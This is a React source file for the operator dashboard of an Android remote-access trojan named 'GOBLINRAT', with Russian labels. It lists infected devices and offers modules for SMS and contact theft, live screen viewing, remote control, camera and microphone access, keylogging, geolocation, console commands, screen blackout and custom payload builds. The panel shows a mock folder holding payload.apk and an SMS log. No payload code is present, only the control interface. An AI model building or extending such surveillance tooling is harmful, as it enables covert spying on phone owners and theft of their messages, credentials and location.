import { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { api, getToken, setToken } from '../api.js';
import Footer from '../components/Footer.jsx';
import {
  IconFolder, IconChat, IconInfo, IconLogs, IconScreen, IconRemote,
  IconCamera, IconKeys, IconBell, IconGeo, IconConsole, IconScreenOff,
  IconLock, IconCall, IconBuild, IconVolt
} from '../Icons.jsx';

/* icon, label, full title */
const MODULES = [
  [IconFolder,   'ФАЙЛЫ',   'Управление файловой системой'],
  [IconChat,     'SMS',     'Получение SMS и контактов'],
  [IconInfo,     'ИНФО',    'Информация об устройстве'],
  [IconLogs,     'ЛОГИ',    'Логи активности на экране'],
  [IconScreen,   'ЭКРАН',   'Просмотр экрана в реальном времени'],
  [IconRemote,   'КОНТРОЛЬ','Удалённое управление экраном'],
  [IconCamera,   'КАМЕРА',  'Доступ к камере и микрофону'],
  [IconKeys,     'КЕЙЛОГ',  'Кейлоггер'],
  [IconBell,     'УВЕДОМ',  'Мониторинг уведомлений'],
  [IconGeo,      'ГЕО',     'Геолокация'],
  [IconConsole,  'КОНСОЛЬ', 'Выполнение команд через консоль'],
  [IconScreenOff,'ВЫКЛ',    'Выключение экрана'],
  [IconLock,     'БЛОК',    'Блокировка кнопок устройства'],
  [IconCall,     'ЗВОНКИ',  'Работа со звонками'],
  [IconBuild,    'БИЛД',    'Создание кастомных билдов']
];

export default function Panel() {
  const nav = useNavigate();
  const [me, setMe] = useState(null);
  const [devs, setDevs] = useState([]);
  const [selId, setSelId] = useState(null);
  const [q, setQ] = useState('');
  const [view, setView] = useState(null);   // null 'info' | 'folder' | {mod:i}
  const [black, setBlack] = useState(false);

  const load = () => api('/devices').then(list => {
    setDevs(list);
    if (list.length && !list.find(d => d.id === selId)) setSelId(list[0].id);
  }).catch(() => {});

  useEffect(() => {
    api('/auth/me').then(setMe).catch(() => { setToken(null); nav('/login', { replace: true }); });
    load();
    const t = setInterval(load, 5000);
    return () => clearInterval(t);
  }, []);

  const sel = devs.find(d => d.id === selId) || null;
  const filtered = useMemo(() => {
    const s = q.trim().toLowerCase();
    return !s ? devs : devs.filter(d => (d.name + ' ' + d.model + ' ' + d.brand).toLowerCase().includes(s));
  }, [devs, q]);

  const logout = () => { setToken(null); nav('/login', { replace: true }); };
  const pickMod = (i, title) => { setBlack(false); setView({ mod: i, title }); };

  const showScreen = view?.mod === 4 && !black;  // ЭКРАН
  const showFolder = view === 'folder';

  return (
    <div className="page panel-page">
      <header className="admin-top">
        <div className="logo"><span className="logo-bracket">[</span> GOBLINRAT <span className="logo-bracket">]</span></div>
        <input className="search devsearch" placeholder="search device id…"
          value={q} onChange={e => setQ(e.target.value)} />
        <div className="admin-me">
          {me?.role === 'admin' && (
            <button className="btn btn-ghost" onClick={() => nav('/admin')}>ADMIN ↗</button>
          )}
          <span className="me-name">&gt;_ {me?.username || '…'}</span>
          <button className="btn btn-ghost" onClick={logout}>LOGOUT</button>
        </div>
      </header>

      <div className="panel-body">
        {/* ----- clients sidebar ----- */}
        <aside className="panel-side">
          <div className="side-label">// ACTIVE DEVICES <i className="blink" /></div>
          <div className="client-list">
            {filtered.map(d => (
              <div key={d.id}
                className={`client-item ${d.id === selId ? 'client-on' : ''} ${d.status !== 'online' ? 'client-off' : ''}`}
                onClick={() => { setSelId(d.id); setView(null); setBlack(false); }}>
                <div className="client-dot">
                  <span className={`dot ${d.status === 'online' ? 'dot-on' : 'dot-off'}`} />
                </div>
                <div className="client-info">
                  <div className="client-name">{d.name}</div>
                  <div className="client-model dim">Model: {d.brand} /// {d.model}</div>
                </div>
                <div className="client-status">{d.status === 'online' ? 'UP' : 'OFF'}</div>
                <span className="kebab">⋮</span>
              </div>
            ))}
            {!filtered.length && (
              <div className="empty-side">— нет устройств. агент не подключён —</div>
            )}
          </div>

          <div className="dl-row">
            <button className="btn btn-ghost btn-dl">DOWNLOAD</button>
            <button className="btn btn-ghost btn-dl">UPLOAD</button>
          </div>
        </aside>

        {/* ----- main view ----- */}
        <main className="panel-main">
          {!sel ? (
            <div className="panel-empty">
              <pre className="ascii">{"   ▄▄▄\n  ░░███\n ░░▐▌\n ░▐▌\n ░▐█▌\n ░░███\n    ▀"}</pre>
              <div className="dim">DEVICE NOT SELECTED</div>
            </div>
          ) : (
            <>
              {/* screen stage */}
              <div className="stage">
                <div className={`phone-frame ${black ? 'phone-black' : ''}`}>
                  <div className="phone-notch" />
                  <div className="phone-screen">
                    {black ? (
                      <div className="phone-blackout" />
                    ) : showScreen ? (
                      <div className="phone-live">
                        <div className="live-clock">17:53</div>
                        <div className="live-date">пт, 29 окт</div>
                        <div className="live-apps">
                          <i /><i /><i /><i /><i /><i /><i /><i />
                        </div>
                        <div className="live-bar" />
                      </div>
                    ) : (
                      <div className="phone-idle">
                        <div className="idle-glyph">▚</div>
                        <div className="dim">{view?.title || 'STANDBY'}</div>
                      </div>
                    )}
                  </div>
                </div>

                {/* right pane: module output */}
                <div className="out-pane">
                  {view === 'info' && sel && (
                    <table className="info-table">
                      <tbody>
                        <tr><td className="dim">ID</td><td>#{sel.id}</td></tr>
                        <tr><td className="dim">NAME</td><td>{sel.name}</td></tr>
                        <tr><td className="dim">BRAND</td><td>{sel.brand}</td></tr>
                        <tr><td className="dim">MODEL</td><td>{sel.model}</td></tr>
                        <tr><td className="dim">ANDROID</td><td>{sel.android}</td></tr>
                        <tr><td className="dim">IP</td><td>{sel.ip}</td></tr>
                        <tr><td className="dim">STATUS</td><td>{sel.status}</td></tr>
                        <tr><td className="dim">LAST SEEN</td><td>{sel.last_seen}</td></tr>
                      </tbody>
                    </table>
                  )}
                  {showFolder && (
                    <pre className="folder-tree">{`/sdcard/
├── Download/
│   └── payload.apk        4.2 MB
├── DCIM/
├── WhatsApp/
└── logs/
    ├── sms.log            128 KB
    
`}  </pre>
                  )}
                  {view?.mod !== undefined && !showFolder && !(view === 'info') && (
                    <div className="mod-out">
                      <div className="mod-title">&gt;_ {view.title}</div>
                      <div className="dim mod-dim">
                        модуль инициализирован. поток данных появится после подключения агента устройства.
                      </div>
                      <div className="mod-pulse"><IconVolt width={26} height={26} /></div>
                    </div>
                  )}
                  {!view && !black && (
                    <div className="out-idle dim">
                      // выбери модуль снизу или действие под экраном
                    </div>
                  )}
                  {black && <div className="out-idle dim">// BLACK MODE: экран устройства выключен</div>}
                </div>
              </div>

              {/* action row */}
              <div className="act-row">
                <button className="act-btn" onClick={() => { setBlack(v => !v); setView(null); }}>
                  {black ? 'WAKE CLIENT' : 'BLACK CLIENT'}
                </button>
                <button className="act-btn" onClick={() => { setBlack(false); setView('info'); }}>PHONE INFO</button>
                <button className="act-btn" onClick={() => { setBlack(false); setView('folder'); }}>CLIENT FOLDER</button>
                <button className="act-btn" onClick={() => setView(null)}>CLEAR VIEW</button>
              </div>

              {/* modules grid */}
              <div className="icon-grid">
                {MODULES.map(([Ic, label, title], i) => (
                  <button key={i} className={`icon-btn ${view?.mod === i ? 'icon-on' : ''}`}
                    title={title} onClick={() => pickMod(i, title)}>
                    <Ic />
                    <span>{label}</span>
                  </button>
                ))}
              </div>
            </>
          )}
        </main>
      </div>

      <Footer />
    </div>
  );
}
